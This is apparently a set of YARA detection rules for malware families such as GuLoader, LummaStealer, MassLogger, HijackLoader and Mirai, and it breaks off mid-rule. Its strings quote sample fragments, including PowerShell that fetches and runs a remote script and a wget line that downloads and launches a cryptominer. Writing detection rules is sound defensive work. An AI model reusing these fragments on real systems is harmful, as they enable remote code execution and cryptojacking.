rule GuLoader_signature__7eae418c7423834ffc3d79b4300bd6fb_imphash__82f827e1 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_7eae418c7423834ffc3d79b4300bd6fb(imphash)_82f827e1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "82f827e1534d4e57fa2437542b2e0b775e52fcba17d804d9a7c3ee353ee0d74a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "unquietude coloproctitis.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.05</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "* 2Qw:Y" fullword ascii /* score: '9.00'*/
      $s5 = "* w_2<" fullword ascii /* score: '9.00'*/
      $s6 = "portables stningsstykket gringle" fullword wide /* score: '9.00'*/
      $s7 = "programnavnenes" fullword wide /* score: '8.00'*/
      $s8 = "adoption" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__7e3684ed {
   meta:
      description = "_subset_batch - file GuLoader(signature)_7e3684ed.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7e3684ed572ab0b5da17c66cf37155bf236cf61d1151ca5d5484b7b54c6788e6"
   strings:
      $s1 = "Execute wmdmgys216ci8jdg" fullword ascii /* score: '18.00'*/
      $s2 = "wrrwnygsms39d7y2q7 = \"rhws0lom5gt9\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6b62 and filesize < 40KB and
      all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash__bec3d853 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_bec3d853.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bec3d8530f326e4b3f8c021d04b30e05595ec3cdeb5f59fd06017d5fb26e8a69"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "auspicate.exe" fullword wide /* score: '18.00'*/
      $s3 = "nstall System v3.02</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "buGr:\\p" fullword ascii /* score: '10.00'*/
      $s5 = "flippendes" fullword wide /* score: '8.00'*/
      $s6 = "saddelmagerarbejdernes" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__84062c623770f0d888e4ca58451aa7ad_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_84062c623770f0d888e4ca58451aa7ad(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4504f2ee6ddd3759336ad84917b87ce3bd94efa5ee24c080898a6d0a41b31405"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '53.00'*/
      $s2 = "requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmln" ascii /* score: '26.00'*/
      $s3 = "nstall System v25-Oct-2022.cvs</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__84062c623770f0d888e4ca58451aa7ad_imphash__cdd2c812 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_84062c623770f0d888e4ca58451aa7ad(imphash)_cdd2c812.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cdd2c8120d61247bbb83f791071f2d99227cb3f0e5129096441ebef1ab014965"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '53.00'*/
      $s2 = "requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmln" ascii /* score: '26.00'*/
      $s3 = "nstall System v25-Oct-2022.cvs</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges" ascii /* score: '19.00'*/
      $s4 = "* Ps_]" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__cb82590b {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_cb82590b.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb82590b5eb2080053bfd952077826095a4be4b0fec995027c1615e21d4229d2"
   strings:
      $x1 = "x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x2 = "x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s3 = "x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s4 = "x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s6 = "x64/tradingnetworkingsockets.dll" fullword ascii /* score: '20.00'*/
      $s7 = "x86/api-ms-win-core-util-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "x86/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s9 = "x64/trading_api64.dll" fullword ascii /* score: '20.00'*/
      $s10 = "x86/api-ms-win-core-profile-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "x86/api-ms-win-crt-conio-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "x86/api-ms-win-core-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "x86/api-ms-win-crt-environment-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "x86/api-ms-win-core-synch-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "x86/api-ms-win-core-sysinfo-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__e6780c07aa5ac5a64c617bd7d7451cb4_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_e6780c07aa5ac5a64c617bd7d7451cb4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f40b80a2809ee918dd4308317d4011a3ca87e2b92a3ab3d2fdaeef231d2e8510"
   strings:
      $s1 = "SupportLib32.dll" fullword wide /* score: '26.00'*/
      $s2 = "Project3.exe" fullword ascii /* score: '22.00'*/
      $s3 = "Cross-platform Process LLC" fullword wide /* score: '17.00'*/
      $s4 = " 2025 Cross-platform Process LLC" fullword wide /* score: '17.00'*/
      $s5 = "Encrypt Component" fullword wide /* score: '14.00'*/
      $s6 = "Download Key" fullword wide /* score: '13.00'*/
      $s7 = "Download Report" fullword wide /* score: '13.00'*/
      $s8 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s9 = "Configure Connection" fullword wide /* score: '12.00'*/
      $s10 = "Run Component" fullword wide /* score: '12.00'*/
      $s11 = "ZQad.dox" fullword ascii /* score: '10.00'*/
      $s12 = "\\3;^f\\67" fullword ascii /* score: '10.00'*/ /* hex encoded string '?g' */
      $s13 = "Authorize Report" fullword wide /* score: '10.00'*/
      $s14 = "FTpWw)nc" fullword ascii /* score: '9.00'*/
      $s15 = "Hello from WindowProc!" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 26000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__51b03652 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_51b03652.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "51b036522abdbc3cd223aaa8dde959ae3f02b80bd1955f61442fcc8e15696a88"
   strings:
      $s1 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s2 = "wuES.exe" fullword wide /* score: '22.00'*/
      $s3 = "wuES.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "txtCommand" fullword wide /* score: '12.00'*/
      $s5 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s6 = "GetPlanet" fullword ascii /* score: '9.00'*/
      $s7 = "tbxContent" fullword wide /* score: '9.00'*/
      $s8 = "GetFleet" fullword ascii /* score: '9.00'*/
      $s9 = ".2!\"$@B]" fullword ascii /* score: '9.00'*/ /* hex encoded string '+' */
      $s10 = "Client Socket Program - Server Connected ..." fullword wide /* score: '9.00'*/
      $s11 = "hazemark" fullword ascii /* score: '8.00'*/
      $s12 = "get_AssemblyCompany" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature_ {
   meta:
      description = "_subset_batch - file MassLogger(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3e0f36140d18878db89c424c6c0293710523c9973bcf5b64f81bc26a2e8de8d6"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "image_00102.exe" fullword ascii /* score: '19.00'*/
      $s3 = "unSPyuQ" fullword ascii /* score: '9.00'*/
      $s4 = "ZEyey0/" fullword ascii /* score: '9.00'*/
      $s5 = ".43.43.@)" fullword ascii /* score: '9.00'*/ /* hex encoded string 'CC' */
      $s6 = "ohhhdhlhbhjhfhnhahi" fullword ascii /* score: '8.00'*/
      $s7 = "wciapei" fullword ascii /* score: '8.00'*/
      $s8 = "wggggggwg" fullword ascii /* score: '8.00'*/
      $s9 = "ydzrcbd" fullword ascii /* score: '8.00'*/
      $s10 = "\\:P:X:T:\\:Rj)" fullword ascii /* score: '8.00'*/
      $s11 = "duvvusu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 15000KB and
      8 of them
}

rule Ligolo_signature__a654b8f223d2b6413ee6ca4822f18ab7_imphash_ {
   meta:
      description = "_subset_batch - file Ligolo(signature)_a654b8f223d2b6413ee6ca4822f18ab7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97969978799100c7be211b9bf8a152bbd826ba6cb55377284537b381a4814216"
   strings:
      $x1 = "C:\\Users\\QWE\\source\\repos\\hosts\\Release\\hosts.pdb" fullword ascii /* score: '38.00'*/
      $s2 = "ssdpdrv.exe" fullword wide /* score: '22.00'*/
      $s3 = "3.0.2.1" fullword wide /* reversed goodware string '1.2.0.3' */ /* score: '16.00'*/
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and all of them
}

rule HijackLoader_signature__2 {
   meta:
      description = "_subset_batch - file HijackLoader(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fe701c864a620c0a598111ef3244c6ad820eea90d5d8df35c082a41455edafbc"
   strings:
      $x1 = "powershell -c \"Invoke-Expression((Get-Clipboard -Raw).Substring(260));\"                                                       " ascii /* score: '69.00'*/
      $x2 = "owWindow((Get-Process -Id $PID).MainWindowHandle,0)); Write-Host \"Please wait.\"; $uu=\"htt\"+\"ps:\"+\"//com\"+\"-res\"+\"tric" ascii /* score: '38.00'*/
      $s3 = "    ((Add-Type '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);' -Name W -PassThru)::" ascii /* score: '27.00'*/
      $s4 = "powershell -c \"Invoke-Expression((Get-Clipboard -Raw).Substring(260));\"                                                       " ascii /* score: '21.00'*/
      $s5 = "c.\"+\"php\"+\"?a=0\"+\"\";$rr=[Net.HttpWebRequest]::Create($uu);$rr.UserAgent=\"Mozilla/5.0\";$ss=$rr.GetResponse().GetResponse" ascii /* score: '20.00'*/
      $s6 = "$bb=[IO.StreamReader]::new($ss).ReadToEnd();.([scriptblock]::Create($bb));$v=\"55e3b5\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule MassLogger_signature__2 {
   meta:
      description = "_subset_batch - file MassLogger(signature).iso"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d564fc65ddd232f1b7c2a80a08661a2275dc6bce08b94938c5fb59d24fdb1024"
   strings:
      $s1 = "http://1009.filemail.com/api/file/get?filekey=BCU9FJ0-jWtKJMrph2J2GtN7jeFacW39xSXbXCrYN55DvkQmrAVRq2MmlB7szQ&pk_vid=a72224d05f76" wide /* score: '27.00'*/
      $s2 = "Agjbnzfbsj.exe" fullword wide /* score: '22.00'*/
      $s3 = "AAgjbnzfbsj, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s4 = "BByteSizeLib, Version=1.2.4.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s5 = "Ybylzcktm" fullword ascii /* base64 encoded string*/ /* score: '16.00'*/
      $s6 = "DHL- IMP.SCR" fullword ascii /* score: '16.00'*/
      $s7 = "PDF.scr" fullword wide /* score: '15.00'*/
      $s8 = "decryptor" fullword wide /* score: '15.00'*/
      $s9 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s10 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s11 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s12 = "PDHL- IMPORTANT NOTICE-STOP TRADE" fullword wide /* score: '11.00'*/
      $s13 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s14 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s15 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x0000 and filesize < 200KB and
      8 of them
}

rule LummaStealer_signature__4f3322a8da9884a1eeb4461341e75067_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_4f3322a8da9884a1eeb4461341e75067(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2646ca597f90c084f80741cf122b58e55767582135a7d90e93cd6ffd165e9d4b"
   strings:
      $x1 = "C:\\Users\\admin\\Desktop\\1234\\cr\\crypt\\premium_crypt\\2375301d-2594-4d5c-98ee-527073778946\\FastCrypt.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s3 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s4 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s5 = "3 3,343@3" fullword ascii /* score: '9.00'*/ /* hex encoded string '343' */
      $s6 = ">#?7?b?{?" fullword ascii /* score: '9.00'*/ /* hex encoded string '{' */
      $s7 = "=*=.=2=6=" fullword ascii /* score: '9.00'*/ /* hex encoded string '&' */
      $s8 = "nullptr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__70ffcccd {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_70ffcccd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "70ffcccdedd4cbfce9d10e4bf42f9917f33c055ba2078b76976827f3d604ccfb"
   strings:
      $s1 = "mtrB.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "FXWx5L:\\" fullword ascii /* score: '10.00'*/
      $s7 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s8 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s9 = "csvContent" fullword ascii /* score: '9.00'*/
      $s10 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s11 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s12 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9cc0ec6a {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9cc0ec6a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9cc0ec6a21bd5a6623933e5d35f40cf3d5f3bc9465c0e848b6b39fe8fe1c7038"
   strings:
      $s1 = "wmpW.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "NxdV&Z:\\!#" fullword ascii /* score: '10.00'*/
      $s7 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s8 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s9 = "csvContent" fullword ascii /* score: '9.00'*/
      $s10 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s11 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s12 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s13 = " -a:v " fullword ascii /* score: '9.00'*/
      $s14 = "=muNFtpL" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b3117e84 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b3117e84.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b3117e84343f3296038c1f2bc91ae2ce0a1eef33855b535dbc0a6110c541bb6d"
   strings:
      $s1 = "BIWN.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s7 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s8 = "csvContent" fullword ascii /* score: '9.00'*/
      $s9 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s10 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s11 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Mirai_signature__036b2e61 {
   meta:
      description = "_subset_batch - file Mirai(signature)_036b2e61.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "036b2e61efb590e1d305157b07d9c6cefada23a0b98e303fb0b19ee1270696ae"
   strings:
      $s1 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s2 = "tsgoingon" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Loki_signature__44601a87d08cad80f9344ba21ee604a5_imphash_ {
   meta:
      description = "_subset_batch - file Loki(signature)_44601a87d08cad80f9344ba21ee604a5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "52490cd234f8c843caff07c58f0a7a3436b45cc8fc6cb02d90acf81292c2fe56"
   strings:
      $s1 = "Coughin.exe" fullword wide /* score: '22.00'*/
      $s2 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB" fullword ascii /* score: '13.00'*/
      $s3 = "[[[[[[[6666" fullword ascii /* score: '9.00'*/ /* hex encoded string 'ff' */
      $s4 = "bbbbbbbiiiiiii" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule LummaStealer_signature__0a6f39c391331cffe72e73764720f897_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_0a6f39c391331cffe72e73764720f897(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4db62952dd620cfb1cba1a28811bae7d6c86c37418d5e9076b8a6129dc3049a5"
   strings:
      $x1 = "C:\\Users\\admin\\Desktop\\1234\\cr\\crypt\\premium_crypt\\960256de-8e0a-4145-9809-7b1c6c3c3dfb\\FastCrypt.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s3 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s4 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s5 = "nullptr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__5bc4330a201086f2e5edf6973b6d6d97_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_5bc4330a201086f2e5edf6973b6d6d97(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6d98032159f11b77efc7e615cee35313c4ad817d525b4d32f80149e89cdad0f7"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\cr\\crypt\\fast_crypt_premium\\user123\\FastCrypt.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s3 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s4 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s5 = "nullptr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__f18c1abdfd0ad84ca3ad683c4afcb2e6_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_f18c1abdfd0ad84ca3ad683c4afcb2e6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "73475348bbc590334310deb15b1871f21de5a9534cd8adee04af83eec595dc47"
   strings:
      $x1 = "C:\\Users\\admin\\Desktop\\1234\\cr\\crypt\\fast_crypt\\893c5ccb-79a6-45c9-9a7e-c19c776b4301\\FastCrypt.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s3 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s4 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s5 = "6 6,6@6\\6`6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'fff' */
      $s6 = "* ?'}g" fullword ascii /* score: '9.00'*/
      $s7 = "324.@b-]{" fullword ascii /* score: '9.00'*/ /* hex encoded string '2K' */
      $s8 = "nullptr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__f7e67ead {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_f7e67ead.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f7e67ead7b07d252a412022c30ceb7884e92952c83145eefc51dec438fdd464d"
   strings:
      $s1 = "<tbody><tr><td align=3D\"center\"><a href=3D\"https://nfl.smlwiki.com/\" target=" fullword ascii /* score: '27.00'*/
      $s2 = "ef=3D\"https://nfl.smlwiki.com/whatisit.html\" target=3D\"_parent\">MADDENVERSE=" fullword ascii /* score: '27.00'*/
      $s3 = "fl.smlwiki.com/chat.html\" target=3D\"_parent\"><img src=3D\"https://nfl.smlwik=" fullword ascii /* score: '27.00'*/
      $s4 = "fl.smlwiki.com/play.php\" target=3D\"_parent\"><img src=3D\"https://nfl.smlwiki=" fullword ascii /* score: '27.00'*/
      $s5 = "fl.smlwiki.com/notes.html\" target=3D\"_parent\"><img src=3D\"https://nfl.smlwi=" fullword ascii /* score: '27.00'*/
      $s6 = "fl.smlwiki.com/hangout.html\" target=3D\"_parent\"><img src=3D\"https://nfl.sml=" fullword ascii /* score: '27.00'*/
      $s7 = "target=3D\"_parent\"><img src=3D\"https://nfl.smlwiki.com/global/wall_employee=" fullword ascii /* score: '27.00'*/
      $s8 = "/oldwebsite.html\" target=3D\"_parent\"><img src=3D\"https://nfl.smlwiki.com/gl=" fullword ascii /* score: '27.00'*/
      $s9 = "fl.smlwiki.com/\" target=3D\"_parent\">HOME</a> </th> <th width=3D\"120\"> <a hr=" fullword ascii /* score: '24.00'*/
      $s10 = "Content-Location: https://nfl.smlwiki.com/global/header.html" fullword ascii /* score: '23.00'*/
      $s11 = "Content-Location: https://nfl.smlwiki.com/global/logo2.png" fullword ascii /* score: '23.00'*/
      $s12 = "=3D\"_parent\"><img src=3D\"https://nfl.smlwiki.com/global/logo2.png\" alt=3D\"l=" fullword ascii /* score: '22.00'*/
      $s13 = "Content-Location: https://nfl.smlwiki.com/global/wall_read-cold.png" fullword ascii /* score: '21.00'*/
      $s14 = "=3D\"https://nfl.smlwiki.com/verse2.png\" style=3D\"margin-left: -24px; transf=" fullword ascii /* score: '21.00'*/
      $s15 = "</a></th> <th width=3D\"150\"><a href=3D\"https://nfl.smlwiki.com/#\">Report sp=" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x7246 and filesize < 700KB and
      8 of them
}

rule LummaStealer_signature_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature).unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "622bed22b5d558e4b4a009d72afc398174b124f263437381ab18e7d2abab8067"
   strings:
      $s1 = "Content-Location: https://smlwiki.com/bin.l/headertop.jpeg" fullword ascii /* score: '23.00'*/
      $s2 = "<body><header><a href=3D\"https://smlwiki.com/\"><img class=3D\"logo\" id=3D\"lo=" fullword ascii /* score: '23.00'*/
      $s3 = "  header img.logo { height: 75px; width: fit-content; }" fullword ascii /* score: '23.00'*/
      $s4 = "Content-Location: https://smlwiki.com/global/logo.png" fullword ascii /* score: '23.00'*/
      $s5 = "Content-Location: https://smlwiki.com/global/header.css" fullword ascii /* score: '23.00'*/
      $s6 = "ink rel=3D\"stylesheet\" href=3D\"https://smlwiki.com/global/header.css\"></hea=" fullword ascii /* score: '22.00'*/
      $s7 = "2\" src=3D\"https://smlwiki.com/global/logo.png\" align=3D\"middle\" height=3D\"9=" fullword ascii /* score: '22.00'*/
      $s8 = "content=3D\"https://smlwiki.com/future.gif\"> <meta name=3D\"theme-color\" cont=" fullword ascii /* score: '22.00'*/
      $s9 = "header img.logo, nav a { image-rendering: pixelated !important; cursor: url=" fullword ascii /* score: '21.00'*/
      $s10 = "header img.logo { margin-top: 37px; user-select: none; }" fullword ascii /* score: '21.00'*/
      $s11 = "<button id=3D\"twitshare\"><a href=3D\"https://smlwiki.com/madden#\"><img src=" fullword ascii /* score: '20.00'*/
      $s12 = "Content-Location: https://smlwiki.com/madden03.webp" fullword ascii /* score: '18.00'*/
      $s13 = "Snapshot-Content-Location: https://smlwiki.com/madden" fullword ascii /* score: '18.00'*/
      $s14 = "Content-Location: https://smlwiki.com/madden05.png" fullword ascii /* score: '18.00'*/
      $s15 = "Content-Location: https://smlwiki.com/madden04.webp" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7246 and filesize < 200KB and
      8 of them
}

rule Mirai_signature__0ed758ae {
   meta:
      description = "_subset_batch - file Mirai(signature)_0ed758ae.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ed758aeeb5596c9db5be5a67b608960461376cf0209cb60629e2ae7bc282419"
   strings:
      $x1 = "    if download_fallback && launch_program \"$fallback_executable\" -o hosts-to-ignore.ignorelist.com:9443 --tls ; then" fullword ascii /* score: '39.00'*/
      $x2 = "        wget -O \"$HOME_1/systemdev/yes.tar.xz\" \"https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl\" " ascii /* score: '35.00'*/
